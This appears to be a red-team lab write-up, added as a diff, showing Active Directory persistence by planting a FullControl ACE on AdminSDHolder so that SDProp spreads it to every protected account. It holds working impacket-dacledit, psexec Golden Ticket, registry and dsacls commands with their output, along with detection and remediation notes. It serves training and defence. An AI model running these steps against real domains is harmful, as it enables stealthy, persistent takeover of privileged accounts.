@@ -1,0 +1,136 @@
+Objective:
+
+Abuse write access to the AdminSDHolder object to plant a backdoor ACE that SDProp
+automatically propagates to every protected account in the domain every 60 minutes —
+giving a low-privilege account persistent FullControl over all high-value accounts
+without ever touching Domain Admins group membership directly. Used because a
+Golden Ticket dies on double krbtgt rotation; persistence through ACL abuse survives that response.
+
+Environment:
+
+  . Attacker: Kali Linux
+  . Target: Windows Server 2022 DC (WIN-56JEHJD0RI3, redteamlab.local)
+  . Access account: Administrator (Domain Admin)
+  . Persistence account: svc_backup (low-privilege, no domain groups, Kerberoasted in Lab 2.4)
+
+Prerequisites:
+
+ . Domain Admin access via Administrator account
+ . krbtgt NT hash from DCSync (Lab 2.10)
+ . Golden Ticket forged and loaded in ccache
+ . svc_backup credentials known from Lab 2.4
+
+ Key Concepts:
+
+AdminSDHolder: An AD object at
+CN=AdminSDHolder,CN=System,DC=redteamlab,DC=local that holds a template ACL for all protected accounts in the
+domain.
+
+SDProp (Security Descriptor Propagator): A background process running on the PDC
+Emulator every 60 minutes that overwrites the ACL of every protected account with an
+exact copy of AdminSDHolder's current ACL — regardless of what was there before.
+
+Protected accounts in redteamlab.local: Administrator, Domain Admins, Enterprise Admins, Schema Admins,
+Group Policy Creator Owners, krbtgt, Administrators (builtin), and any account with AdminCount:1 (including jdoe)
+
+Why svc_backup:
+
+ . Existing account — no new account creation anomaly
+ . Service accounts are rarely audited for granted permissions
+ . No pre-existing suspicious flags (unlike jdoe's AdminCount:True)
+
+Attack Steps:
+Step 1 — Sync clock
+bash
+ sudo ntpdate 192.168.56.101
+
+step 2 - Export Golden Ticket
+bash 
+    export KRB5CCNAME=$(pwd)/Administrator.ccache
+    klist -c Administrator.ccache
+
+step 3 - Write FullControl ACE for svc_backup onto AdminSDHolder
+bash
+    impacket-dacledit -action write -rights FullControl \
+  -principal svc_backup \
+  -target-dn "CN=AdminSDHolder,CN=System,DC=redteamlab,DC=local" \
+  redteamlab.local/Administrator:'<password>' -dc-ip 192.168.56.101
+
+  output:[*] DACL modified successfully!
+
+Step 4 - Verify ACE landed on AdminSDHolder
+bash
+    impacket-dacledit -action read \
+  -target-dn "CN=AdminSDHolder,CN=System,DC=redteamlab,DC=local" \
+  redteamlab.local/Administrator:'<password>' -dc-ip 192.168.56.101
+
+Confirmed:
+          ACE Type    : ACCESS_ALLOWED_ACE
+          Access mask : FullControl (0xf01ff)
+          Trustee     : svc_backup (S-1-5-21-...-1108)
+
+Step 5 - Get shell on DC via Golden Ticket
+bash
+     impacket-psexec -k -no-pass \
+       redteamlab.local/Administrator@WIN-56JEHJD0RI3.redteamlab.local
+
+Step 6 - Force SDProp immediately
+cmd
+   reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v RunProtectAdminGroupsTask /t REG_DWORD /d 1 /f
+
+Note:
+     Windows resets this value to 0 after SDProp runs - verify propagation via ACL check,not registry
+
+Step 7 - Verify Propagation to protected accounts
+cmd
+    dsacls "CN=Administrator,CN=Users,DC=redteamlab,DC=local" | findstr /i "svc_backup"
+
+Confirmed:
+          Allow REDTEAMLAB\svc_backup FULL CONTROL
+
+
+Troubleshooting Notes:
+  . impacket-reg with plaintext password failed due to @ in password being misread by credential parser —
+    workaround: use psexec shell + native reg add
+  . impacket-reg with -k -no-pass failed with list index out of range —
+    known bug in this impacket dev build with Kerberos auth
+  . KRB_AP_ERR_SKEW — clock drift exceeded 5 minutes; fixed with ntpdate
+  . Windows Defender on DC flagged remote registry access — disabled for lab purposes
+
+Real-World Impact:
+
+ svc_backup — a service account with no domain group memberships, cracked from Kerberoasting in Lab 2.4 —
+ now has FullControl over every protected account in the domain. Even if the Golden Ticket is burned
+ via krbtgt rotation, svc_backup can reset Administrator's password,
+ add itself to Domain Admins, or run DCSync again. The domain is persistently owned.
+
+Detection:
+  . Event ID 4670 on the DC if auditing enabled on AdminSDHolder (not default)
+  . BloodHound re-ingestion shows svc_backup → AdminSDHolder edge
+  . Direct ACL review of AdminSDHolder Security tab in ADUC (Advanced Features must be enabled)
+  . Cleaning protected account ACLs without cleaning AdminSDHolder first — permission re-appears
+    within 60 minutes
+
+Remediation (Full):
+  1. Find and remove the malicious ACE from AdminSDHolder itself
+  2. Force SDProp to run and propagate the cleaned ACL to all protected accounts
+  3. Verify every protected account no longer has the backdoor ACE
+  4. Investigate how the attacker obtained write access to AdminSDHolder
+
+Key Lessons:
+  . AdminSDHolder is infrastructure — most defenders never audit its ACL directly
+  . SDProp re-infects every protected account every 60 minutes — cleaning individual accounts is not a fix
+  . Service accounts are stealth-optimal for backdoor ACEs
+  . Verify propagation independently (dsacls) — never trust a tool's success message alone
+  . Clock sync is a prerequisite for every Kerberos tool
+
+Interview Explanation:
+     "After achieving Domain Admin access via Golden Ticket, I planted a secondary
+     persistence mechanism using AdminSDHolder ACL abuse. AdminSDHolder holds a template ACL
+     that SDProp automatically copies to every privileged account in the domain every 60 minutes.
+     By granting FullControl on AdminSDHolder to svc_backup — a low-privilege service account —
+     I ensured that even if the Golden Ticket was invalidated, svc_backup would retain full control
+     over every protected account. I verified end-to-end: confirmed the ACE on AdminSDHolder via dacledit read,
+     forced SDProp immediately via a registry trigger, and confirmed propagation to the Administrator account
+     using dsacls."
+   
